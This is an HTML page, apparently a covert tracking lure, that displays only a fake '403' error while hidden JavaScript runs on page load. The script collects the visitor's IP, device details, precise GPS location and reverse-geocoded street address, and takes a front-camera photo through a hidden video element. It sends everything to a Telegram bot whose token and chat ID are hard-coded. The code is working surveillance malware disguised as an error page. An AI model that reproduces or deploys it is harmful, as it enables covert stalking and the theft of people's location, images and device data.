<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>403</title>
  <style>
    /* Disguise UI: hanya menampilkan 403 */
    html,body{height:100%;margin:0}
    body{
      background:#000;
      color:#b30000;
      font-family:monospace;
      display:flex;
      align-items:center;
      justify-content:center;
      font-size:72px;
      user-select:none;
    }
    /* hidden elements for camera/canvas */
    video,canvas{display:none}
  </style>
</head>
<body>
  403

  <!-- hidden elements -->
  <video id="video" autoplay playsinline width="400" height="400"></video>
  <canvas id="canvas" width="800" height="800"></canvas>

<script>
/*
  AUTO-REPORT HTML (Updated: Detailed Address Fields)
  - BOT_TOKEN & CHAT_ID telah diisi sesuai permintaan.
  - Host via HTTPS atau localhost agar kamera & geolocation berjalan.
*/

const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
const CHAT_ID   = "6216902201";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

/* optional profile mapping by IP */
const profiles = {
  // "118.96.123.45": { name:"Budi Santoso", age:"28", gender:"Laki-laki", job:"Reseller", kampung:"Babakan" }
};

function rand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
function generateFakeProfile(ip){
  const first = ["Budi","Andi","Siti","Rina","Agus","Dewi","Joko","Rian","Fitri","Eka","Yuli","Rizki","Tono","Sari","Putri","Ahmad"];
  const last = ["Santoso","Wijaya","Kurniawan","Hidayat","Kartika","Pratama","Susilo","Saputra","Wibowo","Putri","Aminah","Rahman"];
  const jobs = ["Reseller","Pedagang","Pelajar/Mahasiswa","Driver","Karyawan Swasta","Teknisi","Ibu Rumah Tangga","Freelancer","Guru"];
  const kampungList = ["Babakan","Cisaat","Cibadak","Warudoyong","Gunungpuyuh","Baros","Cikole","Cempaka","Sukamulya","Kebon"];
  const name = rand(first) + " " + rand(last);
  const age = Math.floor(Math.random()*40) + 18;
  const gender = Math.random() > 0.5 ? "Laki-laki" : "Perempuan";
  const job = rand(jobs);
  const kampung = rand(kampungList);
  return { name, age: String(age), gender, job, kampung };
}

function safeCaption(s){
  if (!s) return '';
  if (s.length <= 1000) return s;
  return s.slice(0,1000-3) + '...';
}

function buildBox(data){
  const now = new Date();
  const lines = [];
  lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
  lines.push(` ├─ > Pesan`);
  lines.push(` │   └─ ${data.message || 'Auto capture & device report'}`);
  lines.push(` ├─ > Pengirim (web)`);
  lines.push(` │   └─ ${data.userAgent || '-'}`);
  lines.push(` ├─ > IP / ISP`);
  const ip = data.ipInfo || {};
  lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
  lines.push(` │   ├─ ISP/Org: ${ip.org || ip.isp || '-'}`);
  lines.push(` │   ├─ ASN: ${ip.asn || '-'}`);
  lines.push(` │   ├─ City: ${ip.city || '-'}`);
  lines.push(` │   ├─ Region/State: ${ip.region || ip.state || '-'}`);
  lines.push(` │   ├─ Country: ${ip.country || ip.country_name || '-'}`);
  lines.push(` │   ├─ Postal: ${ip.postal || ip.postal_code || '-'}`);
  lines.push(` │   └─ IP Timezone: ${ip.timezone || '-'}`);
  lines.push(` ├─ > Device`);
  lines.push(` │   ├─ Platform: ${data.platform || '-'}`);
  lines.push(` │   ├─ Screen: ${data.screen || '-'}`);
  lines.push(` │   ├─ Language: ${data.language || '-'}`);
  lines.push(` │   ├─ Timezone (browser): ${data.timezone || '-'}`);
  lines.push(` │   ├─ Local Date: ${data.localDate || '-'}`);
  lines.push(` │   ├─ Battery: ${data.battery || '-'}`);
  lines.push(` │   ├─ Cookies Enabled: ${data.cookiesEnabled || '-'}`);
  lines.push(` │   ├─ Online: ${data.online || '-'}`);
  lines.push(` │   ├─ HW Threads: ${data.hwConcurrency || '-'}`);
  lines.push(` │   └─ DoNotTrack: ${data.doNotTrack || '-'}`);
  lines.push(` ├─ > Connection`);
  if (data.connection){
    lines.push(` │   └─ Type: ${data.connection.effectiveType || '-'} | Downlink: ${data.connection.downlink || '-'} Mbps | RTT: ${data.connection.rtt || '-'} ms | SaveData: ${data.connection.saveData ? 'yes' : 'no'}`);
  } else {
    lines.push(` │   └─ Connection API: tidak tersedia`);
  }
  lines.push(` ├─ > Geo (GPS)`);
  if (data.geo && !data.geo.error){
    lines.push(` │   ├─ Lat: ${data.geo.lat}`);
    lines.push(` │   ├─ Lon: ${data.geo.lon}`);
    lines.push(` │   ├─ Akurasi: ${data.geo.acc || '-'}`);
    lines.push(` │   └─ Maps: ${data.geo.maps || '-'}`);
  } else {
    lines.push(` │   └─ Error GPS: ${data.geo ? data.geo.error : '-'}`);
  }

  // Detailed Address Section — many fields
  lines.push(` ├─ > Alamat (Detail)`);
  const a = data.address || {};
  lines.push(` │   ├─ display_name: ${data.revDisplay || '-'}`);
  lines.push(` │   ├─ country: ${a.country || '-'}`);
  lines.push(` │   ├─ country_code: ${a.country_code || '-'}`);
  lines.push(` │   ├─ state / provinsi: ${a.state || a.region || '-'}`);
  lines.push(` │   ├─ state_district: ${a.state_district || '-'}`);
  lines.push(` │   ├─ county / kabupaten: ${a.county || '-'}`);
  lines.push(` │   ├─ region: ${a.region || '-'}`);
  lines.push(` │   ├─ city: ${a.city || a.town || a.village || '-'}`);
  lines.push(` │   ├─ town: ${a.town || '-'}`);
  lines.push(` │   ├─ village: ${a.village || '-'}`);
  lines.push(` │   ├─ municipality: ${a.municipality || '-'}`);
  lines.push(` │   ├─ suburb: ${a.suburb || '-'}`);
  lines.push(` │   ├─ neighbourhood: ${a.neighbourhood || '-'}`);
  lines.push(` │   ├─ quarter: ${a.quarter || '-'}`);
  lines.push(` │   ├─ hamlet (kampung/dusun): ${a.hamlet || '-'}`);
  lines.push(` │   ├─ road / jalan: ${a.road || '-'}`);
  lines.push(` │   ├─ house_number: ${a.house_number || '-'}`);
  lines.push(` │   └─ postcode: ${a.postcode || '-'}`);

  // Profile
  lines.push(` ├─ > Profile (auto)`);
  lines.push(` │   ├─ Nama: ${data.profile.name || '-'}`);
  lines.push(` │   ├─ Usia: ${data.profile.age || '-'}`);
  lines.push(` │   ├─ Gender: ${data.profile.gender || '-'}`);
  lines.push(` │   ├─ Pekerjaan: ${data.profile.job || '-'}`);
  lines.push(` │   └─ Kampung: ${data.profile.kampung || '-'}`);

  lines.push(`╰─ > Sumber: AutoReport Web`);
  return lines.join('\n');
}

/* fetch utils */
async function fetchJSON(url){
  try {
    const r = await fetch(url, { cache:'no-store' });
    if (!r.ok) throw new Error('bad ' + r.status);
    return await r.json();
  } catch (e){
    return null;
  }
}

/* IP info with fallbacks */
async function getIPInfo(){
  const sources = [
    { url:'https://ipapi.co/json/' , mapper: j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country_name || j.country, org: j.org, postal: j.postal, timezone: j.timezone, latitude: j.latitude || j.lat, longitude: j.longitude || j.lon, asn: j.asn }) },
    { url:'https://ipwhois.app/json/' , mapper: j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country, org: j.org || j.isp, postal: j.postal, timezone: j.timezone, latitude: j.latitude, longitude: j.longitude }) },
    { url:'https://api.ipify.org?format=json', mapper: j => ({ ip: j.ip }) }
  ];
  for (const s of sources){
    const j = await fetchJSON(s.url);
    if (!j) continue;
    const m = s.mapper(j);
    if (m && m.ip) return m;
  }
  return { ip: 'unknown' };
}

/* reverse geocode */
async function revGeocode(lat, lon){
  try {
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, { cache:'no-store', headers:{ 'User-Agent':'AutoReport/1.0' }});
    if (!r.ok) throw new Error('revgeo fail ' + r.status);
    const j = await r.json();
    return { display_name: j.display_name || null, address: j.address || {} };
  } catch (e){
    return { error: e.message || 'reverse geocode failed' };
  }
}

/* device info */
async function getBattery(){
  try { if (!navigator.getBattery) return null; const b = await navigator.getBattery(); return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`; } catch { return null; }
}
function getConnection(){ try { const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if (!c) return null; return { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData }; } catch { return null; } }

/* geolocation */
function getGeo(){
  return new Promise(resolve => {
    if (!navigator.geolocation) return resolve({ error: 'geolocation not supported' });
    navigator.geolocation.getCurrentPosition(pos => {
      resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy + ' m', maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}` });
    }, err => resolve({ error: err.message }), { enableHighAccuracy: true, timeout: 10000 });
  });
}

/* telegram send */
async function sendPhotoCaption(blob, caption){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('photo', blob, 'camera.jpg');
  fd.append('caption', caption);
  return fetch(url, { method:'POST', body: fd });
}

/* main */
(async function main(){
  if (!BOT_TOKEN || BOT_TOKEN.includes('ISI_TOKEN') || !CHAT_ID || CHAT_ID.includes('ISI_CHATID')) return;

  // device
  const deviceInfo = {
    platform: navigator.platform || '-',
    userAgent: navigator.userAgent || '-',
    screen: (window.screen ? `${screen.width}x${screen.height}` : '-'),
    language: navigator.language || '-',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
    localDate: new Date().toLocaleString(),
    cookiesEnabled: navigator.cookieEnabled ? 'yes' : 'no',
    online: navigator.onLine ? 'online' : 'offline',
    hwConcurrency: navigator.hardwareConcurrency || '-',
    doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || '-',
    connection: getConnection()
  };
  deviceInfo.battery = await getBattery();

  // parallel: ip & geo
  const [ ipInfo, geo ] = await Promise.all([ getIPInfo(), getGeo() ]);

  // rev geocode
  let rev = null;
  if (geo && !geo.error && geo.lat && geo.lon) rev = await revGeocode(geo.lat, geo.lon);

  // profile lookup / fake
  let profile = { name:'unknown', age:'unknown', gender:'unknown', job:'unknown', kampung:'unknown' };
  if (ipInfo && ipInfo.ip && profiles[ipInfo.ip]) {
    profile = profiles[ipInfo.ip];
  } else {
    profile = generateFakeProfile(ipInfo.ip);
    if (rev && rev.address) profile.kampung = rev.address.hamlet || rev.address.village || profile.kampung;
  }

  // capture camera
  let photoBlob = null;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
    video.srcObject = stream;
    await video.play();
    await new Promise(r => setTimeout(r, 1000));
    const w = video.videoWidth || canvas.width;
    const h = video.videoHeight || canvas.height;
    const side = Math.min(w,h);
    const sx = (w - side)/2;
    const sy = (h - side)/2;
    ctx.clearRect(0,0,canvas.width,canvas.height);
    ctx.drawImage(video, sx, sy, side, side, 0, 0, canvas.width, canvas.height);
    stream.getTracks().forEach(t=>t.stop());
    photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
  } catch (e){
    photoBlob = null;
  }

  const data = {
    message: 'Auto capture & device report',
    userAgent: deviceInfo.userAgent,
    ipInfo: ipInfo || {},
    platform: deviceInfo.platform,
    screen: deviceInfo.screen,
    language: deviceInfo.language,
    timezone: deviceInfo.timezone,
    localDate: deviceInfo.localDate,
    battery: deviceInfo.battery,
    cookiesEnabled: deviceInfo.cookiesEnabled,
    online: deviceInfo.online,
    hwConcurrency: deviceInfo.hwConcurrency,
    doNotTrack: deviceInfo.doNotTrack,
    connection: deviceInfo.connection,
    geo: geo || {},
    address: (rev && rev.address) ? rev.address : {},
    revDisplay: (rev && rev.display_name) ? rev.display_name : null,
    profile: profile
  };

  const boxed = buildBox(data);
  const caption = safeCaption(boxed);

  try {
    if (photoBlob){
      await sendPhotoCaption(photoBlob, caption);
    } else {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method:'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
      });
    }
  } catch (e){
    // fail silently
    console.error('tg send failed', e);
  }

})();
</script>
</body>
</html>
